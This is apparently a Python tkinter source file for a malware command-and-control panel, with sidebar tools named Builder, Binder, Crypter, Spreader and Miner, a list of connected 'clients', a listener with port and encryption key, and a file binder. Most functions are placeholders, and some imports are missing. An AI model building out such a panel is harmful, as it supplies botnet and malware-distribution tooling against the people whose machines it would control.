import tkinter as tk
from tkinter import ttk
import threading
import os
import socket
from builder import BuilderFrame
import tkinter.filedialog as filedialog



class ControlCommandCenterGUI:
    def __init__(self, root):
        self.root = root

        self.create_gui()

        # Example client data
        self.clients = [
            {"client_id": "Client1", "ip_address": "192.168.1.10", "status": "Connected"},
            {"client_id": "Client2", "ip_address": "192.168.1.20", "status": "Connected"},
            {"client_id": "Client3", "ip_address": "192.168.1.30", "status": "Connected"}
        ]
        self.update_client_list()

    def create_gui(self):
        # Sidebar panel
        self.sidebar_panel = tk.Frame(self.root, width=200, bg="lightgray")
        self.sidebar_panel.pack(side="left", fill="y")

        # Client List button
        client_list_button = ttk.Button(self.sidebar_panel, text="Client List", command=self.show_client_list)
        client_list_button.pack(pady=10)

        # Options in the sidebar
        options = ["Builder", "Binder", "Crypter", "Spreader", "Updater", "Social", "Downloader", "Binaries", "Miner"]
        for option in options:
            btn = ttk.Button(self.sidebar_panel, text=option, command=lambda opt=option: self.option_selected(opt))
            btn.pack(pady=10)

        # Main content frame
        self.main_frame = tk.Frame(self.root)
        self.main_frame.pack(fill="both", expand=True)

        # Create initial content
        self.create_default_content()
            
        # Listener button
        self.listener_button = ttk.Button(self.sidebar_panel, text="Listener", command=self.toggle_listener_frame)
        self.listener_button.pack(pady=10)
        # Listener settings frame
        self.listener_frame = ListenerSettingsFrame(self.root, self.toggle_listener_frame)        

        # Client list view
        self.tree = ttk.Treeview(self.root)
        self.tree["columns"] = ("IP", "Status")
        self.tree.heading("#0", text="Client ID")
        self.tree.heading("IP", text="IP Address")
        self.tree.heading("Status", text="Status")
        self.tree.pack(fill="both", expand=True)

        # Ping clients button
        ping_button = ttk.Button(self.sidebar_panel, text="Ping Clients", command=self.ping_clients)
        ping_button.pack(pady=10)

    def update_client_list(self):
        # Clear existing items in the tree
        self.tree.delete(*self.tree.get_children())

        # Insert updated client list into the tree
        for client in self.clients:
            client_id = client["client_id"]
            ip_address = client["ip_address"]
            status = client["status"]
            self.tree.insert("", "end", text=client_id, values=(ip_address, status))


    def create_default_content(self):
        # Clear the main frame
        self.clear_main_frame()

        # Default content
        default_label = ttk.Label(self.main_frame, text="Select an option from the sidebar")
        default_label.pack()

    def clear_main_frame(self):
        # Clear the main frame
        for widget in self.main_frame.winfo_children():
            widget.pack_forget()

    def option_selected(self, option):
        if option == "Builder":
            self.show_builder_frame()
        elif option == "Binder":
            self.show_binder_frame()            

    def show_builder_frame(self):
        # Clear the current frame
        for widget in self.root.winfo_children():
            widget.pack_forget()

    # Builder frame
        builder_frame = BuilderFrame(self.root, self.builder_callback, self)
        builder_frame.pack()
        
    def show_binder_frame(self):
        self.clear_main_frame()

        # Binder frame
        binder_frame = BinderFrame(self.main_frame, self.binder_callback)
        binder_frame.pack()


    def builder_callback(self, host, port, key):
        # Placeholder function to handle client build process
        print("Building client...")
        print("Host:", host)
        print("Port:", port)
        print("Encryption Key:", key)

        # After building the client, return to the main GUI
        self.create_gui()
        self.update_client_list()

    def binder_callback(self, file_paths):
        # Placeholder function to handle binder process
        print("Binding files...")
        for file_path in file_paths:
            print("File:", file_path)

        # After binding the files, return to the main GUI
        self.create_default_content()


    def ping_clients(self):
        # Ping all clients to get a status update
        for client in self.clients:
            ip_address = client["ip_address"]
            threading.Thread(target=self.ping_client, args=(ip_address,), daemon=True).start()

    def ping_client(self, ip_address):
        # Ping a client and update its status
        try:
            socket.setdefaulttimeout(5)
            response = os.system("ping -n 1 " + ip_address)
            if response == 0:
                self.update_client_status(ip_address, "Connected")
            else:
                self.update_client_status(ip_address, "Disconnected")
        except:
            self.update_client_status(ip_address, "Disconnected")

    def update_client_status(self, ip_address, status):
        # Update the status of a client in the list
        for client in self.clients:
            if client["ip_address"] == ip_address:
                client["status"] = status
                break

        # Update the client list view
        self.update_client_list()

    def show_client_list(self):
        # Clear the current frame
        for widget in self.root.winfo_children():
            widget.pack_forget()

        # Re-create the GUI
        self.create_gui()
        self.update_client_list()
        
    def toggle_listener_frame(self):
        if self.listener_frame.is_visible:
            self.listener_frame.hide()
            self.listener_button["text"] = "Listener"
        else:
            self.listener_frame.show()
            self.listener_button["text"] = "Minimize"

    def refresh_timer(self):
        # Refresh the client list every 30 seconds
        self.update_client_list()
        self.root.after(30000, self.refresh_timer)

    def load_listener_settings(self):
        # Load listener settings from file if available
        if os.path.isfile("listener_settings.json"):
            with open("listener_settings.json", "r") as file:
                data = json.load(file)
                enable = data.get("enable", False)
                port = data.get("port", "")
                key = data.get("key", "")

                # Set the values in the listener settings frame
                self.listener_frame.enable_var.set(enable)
                self.listener_frame.port_var.set(port)
                self.listener_frame.key_var.set(key)

    def save_listener_settings(self):
        # Get the current listener settings from the frame
        enable = self.listener_frame.enable_var.get()
        port = self.listener_frame.port_var.get()
        key = self.listener_frame.key_var.get()

        # Save listener settings to file
        data = {
            "enable": enable,
            "port": port,
            "key": key
        }
        with open("listener_settings.json", "w") as file:
            json.dump(data, file)


class ListenerSettingsFrame(tk.Frame):
    def __init__(self, parent, minimize_callback):
        super().__init__(parent)

        self.minimize_callback = minimize_callback
        self.is_visible = True

        self.enable_var = tk.BooleanVar()
        self.port_var = tk.StringVar()
        self.key_var = tk.StringVar()

        self.create_widgets()

    def create_widgets(self):
        # Enable/Disable Checkbox
        enable_checkbox = ttk.Checkbutton(self, text="Enable", variable=self.enable_var)
        enable_checkbox.pack(pady=10)

        # Port Entry
        port_label = ttk.Label(self, text="Port:")
        port_label.pack()
        port_entry = ttk.Entry(self, textvariable=self.port_var)
        port_entry.pack()

        # Key Entry
        key_label = ttk.Label(self, text="Encryption Key:")
        key_label.pack()
        key_entry = ttk.Entry(self, textvariable=self.key_var)
        key_entry.pack()

    def hide(self):
        self.pack_forget()
        self.is_visible = False

    def show(self):
        self.pack()
        self.is_visible = True

class BinderFrame(tk.Frame):
    def __init__(self, parent, back_callback):
        super().__init__(parent)
        self.parent = parent
        self.back_callback = back_callback
        self.selected_files = []  # List to store selected file paths

        self.create_widgets()

    def create_widgets(self):
        # Output filename entry
        filename_label = ttk.Label(self, text="Output Filename:")
        filename_label.pack()
        self.filename_entry = ttk.Entry(self)
        self.filename_entry.pack()

        # Output directory selection
        directory_label = ttk.Label(self, text="Output Directory:")
        directory_label.pack()
        self.directory_entry = ttk.Entry(self)
        self.directory_entry.pack()
        self.browse_button = ttk.Button(self, text="Browse", command=self.select_directory)
        self.browse_button.pack()

        # File selection
        select_file_button = ttk.Button(self, text="Select File", command=self.add_file)
        select_file_button.pack()

        # Selected files list
        self.selected_files_listbox = tk.Listbox(self, selectmode=tk.MULTIPLE)
        self.selected_files_listbox.pack()

        # Join files button
        join_button = ttk.Button(self, text="Join Files", command=self.join_files)
        join_button.pack()

        # Back button
        back_button = ttk.Button(self, text="Back", command=self.back_callback)
        back_button.pack()

    def select_directory(self):
        # Select the output directory using a file dialog
        directory = filedialog.askdirectory()
        if directory:
            self.directory_entry.delete(0, tk.END)
            self.directory_entry.insert(0, directory)

    def add_file(self):
        # Select multiple files to be bound
        file_paths = filedialog.askopenfilenames()
        if file_paths:
            # Append the selected file paths to the list
            self.selected_files.extend(file_paths)

            # Display the selected files in the listbox
            self.update_selected_files_listbox()

    def update_selected_files_listbox(self):
        # Clear the current listbox
        self.selected_files_listbox.delete(0, tk.END)

        # Insert the selected files into the listbox
        for file_path in self.selected_files:
            self.selected_files_listbox.insert(tk.END, file_path)

    def join_files(self):
        # Get the output filename and directory
        output_filename = self.filename_entry.get()
        output_directory = self.directory_entry.get()

        if output_filename and output_directory:
            # Create the output file path
            output_file_path = os.path.join(output_directory, output_filename)

            # Perform the file joining operation
            with open(output_file_path, "wb") as output_file:
                for file_path in self.selected_files:
                    with open(file_path, "rb") as input_file:
                        output_file.write(input_file.read())

            # Display a message box with the successful completion message
            tk.messagebox.showinfo("File Joining", "Files joined successfully!")

    def get_selected_files(self):
        # Return the list of selected files
        return self.selected_files
